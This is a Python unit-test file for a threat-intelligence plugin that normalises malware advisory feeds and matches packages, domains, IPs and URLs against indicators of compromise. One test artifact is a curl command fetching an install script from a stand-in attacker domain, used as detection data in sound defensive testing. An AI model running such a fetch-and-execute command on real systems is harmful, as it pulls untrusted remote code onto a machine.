import os
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
PLUGIN_ROOT = REPO_ROOT / "plugins" / "pounce"
SCRIPTS_ROOT = PLUGIN_ROOT / "scripts"
if str(SCRIPTS_ROOT) not in sys.path:
    sys.path.insert(0, str(SCRIPTS_ROOT))

import pounce_intel  # noqa: E402


class PounceIntelTests(unittest.TestCase):
    def test_normalize_legacy_seed_payload_promotes_exact_package_and_string_matches(self) -> None:
        payload = {
            "items": [
                {
                    "id": "ioc-1",
                    "severity": "critical",
                    "reason": "Known bad package.",
                    "match": {"type": "package", "ecosystem": "npm", "name": "demo", "version": "1.2.3"},
                },
                {
                    "id": "ioc-2",
                    "severity": "critical",
                    "reason": "Known bad domain.",
                    "match": {"type": "string", "value": "evil.example"},
                },
            ]
        }
        feed = pounce_intel.normalize_feed_artifact(payload, observed_at="2026-04-18T00:00:00Z", default_source="seed_ioc")
        self.assertEqual(feed["items"][0]["match"]["type"], "package_exact")
        self.assertEqual(feed["items"][0]["action"], "block")
        self.assertEqual(feed["items"][1]["match"]["type"], "string")

    def test_active_feed_items_skip_revoked_and_expired_records(self) -> None:
        items = [
            {
                "id": "active",
                "kind": "malicious_package",
                "match": {"type": "package_exact", "ecosystem": "npm", "name": "demo", "version": "1.0.0"},
                "action": "block",
                "confidence": 1.0,
                "reason": "Still active.",
                "source": "osv",
                "source_refs": [{"kind": "osv", "id": "MAL-1"}],
                "published_at": "2026-04-01T00:00:00Z",
                "modified_at": "2026-04-01T00:00:00Z",
                "first_seen": "2026-04-01T00:00:00Z",
                "last_seen": "2026-04-01T00:00:00Z",
            },
            {
                "id": "revoked",
                "kind": "malicious_package",
                "match": {"type": "package_exact", "ecosystem": "npm", "name": "demo", "version": "2.0.0"},
                "action": "block",
                "confidence": 1.0,
                "reason": "Withdrawn.",
                "source": "osv",
                "source_refs": [{"kind": "osv", "id": "MAL-2"}],
                "published_at": "2026-04-01T00:00:00Z",
                "modified_at": "2026-04-01T00:00:00Z",
                "first_seen": "2026-04-01T00:00:00Z",
                "last_seen": "2026-04-01T00:00:00Z",
                "revoked_at": "2026-04-02T00:00:00Z",
            },
            {
                "id": "expired",
                "kind": "ioc_domain",
                "match": {"type": "domain", "value": "gone.example"},
                "action": "warn",
                "confidence": 0.8,
                "reason": "Expired.",
                "source": "github_advisory",
                "source_refs": [{"kind": "ghsa", "id": "GHSA-demo"}],
                "published_at": "2026-04-01T00:00:00Z",
                "modified_at": "2026-04-01T00:00:00Z",
                "first_seen": "2026-04-01T00:00:00Z",
                "last_seen": "2026-04-01T00:00:00Z",
                "expires_at": "2026-04-02T00:00:00Z",
            },
        ]
        active = pounce_intel.active_feed_items(items, at=pounce_intel.parse_timestamp("2026-04-03T00:00:00Z"))
        self.assertEqual([item["id"] for item in active], ["active"])

    def test_find_artifact_matches_supports_string_domain_ip_and_url(self) -> None:
        items = [
            self._item("s1", {"type": "string", "value": "litellm_init.pth"}),
            self._item("d1", {"type": "domain", "value": "evil.example"}),
            self._item("i1", {"type": "ip", "value": "203.0.113.4"}),
            self._item("u1", {"type": "url", "value": "https://evil.example/install.sh"}),
        ]
        matches = pounce_intel.find_artifact_matches(
            items,
            [
                "curl https://evil.example/install.sh",
                "ioc hit 203.0.113.4",
                "drop litellm_init.pth",
            ],
        )
        self.assertEqual({item["id"] for item, _artifact in matches}, {"s1", "d1", "i1", "u1"})

    def test_github_malware_ingestion_uses_modified_filter_and_pagination(self) -> None:
        first_headers = {"Link": '<https://api.github.com/advisories?after=cursor-2>; rel="next"'}
        second_headers = {}
        first_page = [
            {
                "ghsa_id": "GHSA-first",
                "type": "malware",
                "summary": "Malware package.",
                "description": "Calls https://evil.example/install.sh.",
                "published_at": "2026-04-10T00:00:00Z",
                "updated_at": "2026-04-11T00:00:00Z",
                "references": ["https://github.com/advisories/GHSA-first"],
                "vulnerabilities": [
                    {"package": {"ecosystem": "npm", "name": "demo"}, "vulnerable_version_range": "=1.2.3"}
                ],
            }
        ]
        second_page = [
            {
                "ghsa_id": "GHSA-second",
                "type": "malware",
                "summary": "Withdrawn malware package.",
                "description": "Contact 203.0.113.4.",
                "published_at": "2026-04-12T00:00:00Z",
                "updated_at": "2026-04-13T00:00:00Z",
                "withdrawn_at": "2026-04-14T00:00:00Z",
                "references": ["https://github.com/advisories/GHSA-second"],
                "vulnerabilities": [
                    {"package": {"ecosystem": "npm", "name": "demo-two"}, "vulnerable_version_range": "<2.0.0"}
                ],
            }
        ]

        calls: list[str] = []

        def fake_request_json(url: str, **_kwargs: object) -> tuple[object, dict[str, str]]:
            calls.append(url)
            if len(calls) == 1:
                return first_page, first_headers
            return second_page, second_headers

        with mock.patch("pounce_intel.request_json", side_effect=fake_request_json):
            items, source = pounce_intel.github_malware_items_since("2026-04-01T00:00:00Z")

        self.assertEqual(pounce_intel.query_param(calls[0], "modified"), ">=2026-04-01T00:00:00Z")
        self.assertEqual(pounce_intel.query_param(calls[1], "after"), "cursor-2")
        self.assertEqual(source["last_modified"], "2026-04-13T00:00:00Z")
        self.assertTrue(any(item["match"]["type"] == "package_exact" for item in items))
        self.assertTrue(any(item.get("revoked_at") == "2026-04-14T00:00:00Z" for item in items))

    def test_runtime_feed_falls_back_to_last_good_cache_and_warns_when_stale(self) -> None:
        cached_feed = {
            "schema_version": "1.0",
            "generated_at": "2026-04-01T00:00:00Z",
            "sources": [{"name": "osv", "status": "ok"}],
            "items": [
                self._item(
                    "cached-1",
                    {"type": "package_exact", "ecosystem": "npm", "name": "cached-demo", "version": "1.0.0"},
                )
            ],
        }
        with tempfile.TemporaryDirectory() as tmpdir, mock.patch.dict(
            os.environ,
            {
                "POUNCE_STATE_DIR": tmpdir,
                "POUNCE_FEED_STALE_AFTER_HOURS": "6",
            },
            clear=False,
        ):
            pounce_intel.persist_feed_cache(
                cached_feed,
                fetched_at="2026-04-01T01:00:00Z",
                fetched_from="https://feed.example/intel.json",
            )
            with mock.patch(
                "pounce_intel.load_remote_feed",
                side_effect=pounce_intel.IntelUnavailable("timeout"),
            ):
                context = pounce_intel.runtime_feed(PLUGIN_ROOT, "https://feed.example/intel.json")

        warning_details = " ".join(item["detail"] for item in context["warnings"])
        self.assertIn("last good cached feed", warning_details)
        self.assertIn("stale", warning_details)
        self.assertTrue(any(item["id"] == "cached-1" for item in context["feed"]["items"]))

    def test_on_demand_osv_items_normalize_malware_as_block_and_vulns_as_warn(self) -> None:
        malware = {
            "id": "MAL-2026-1",
            "summary": "Known bad package.",
            "details": "Beacon to https://evil.example/install.sh.",
            "published": "2026-04-10T00:00:00Z",
            "modified": "2026-04-10T01:00:00Z",
            "references": [{"type": "WEB", "url": "https://research.example/advisory"}],
            "affected": [
                {"package": {"ecosystem": "npm", "name": "demo"}, "versions": ["1.2.3"]},
            ],
        }
        vuln = {
            "id": "GHSA-demo-vuln",
            "summary": "Regular vulnerability.",
            "details": "Potential issue in https://docs.example/info.",
            "published": "2026-04-10T00:00:00Z",
            "modified": "2026-04-10T01:00:00Z",
            "references": [{"type": "WEB", "url": "https://research.example/vuln"}],
            "affected": [
                {"package": {"ecosystem": "npm", "name": "demo"}, "versions": ["1.2.3"]},
            ],
        }
        with mock.patch("pounce_intel.osv_query_package_version", return_value=[malware, vuln]):
            items = pounce_intel.on_demand_osv_items("npm", "demo", "1.2.3")
        package_items = [item for item in items if item["match"]["type"] == "package_exact"]
        actions = {item["id"].split(":", 1)[0]: item["action"] for item in package_items}
        self.assertEqual(actions["MAL-2026-1"], "block")
        self.assertEqual(actions["GHSA-demo-vuln"], "warn")
        self.assertTrue(any(item["match"]["type"] == "url" for item in items))

    @staticmethod
    def _item(item_id: str, match: dict[str, str]) -> dict[str, object]:
        return {
            "id": item_id,
            "kind": "malicious_package" if match["type"].startswith("package") else "ioc_string",
            "match": match,
            "action": "block",
            "confidence": 1.0,
            "reason": "Test item.",
            "source": "test",
            "source_refs": [{"kind": "test", "id": item_id}],
            "published_at": "2026-04-01T00:00:00Z",
            "modified_at": "2026-04-01T00:00:00Z",
            "first_seen": "2026-04-01T00:00:00Z",
            "last_seen": "2026-04-01T00:00:00Z",
        }


if __name__ == "__main__":
    unittest.main()
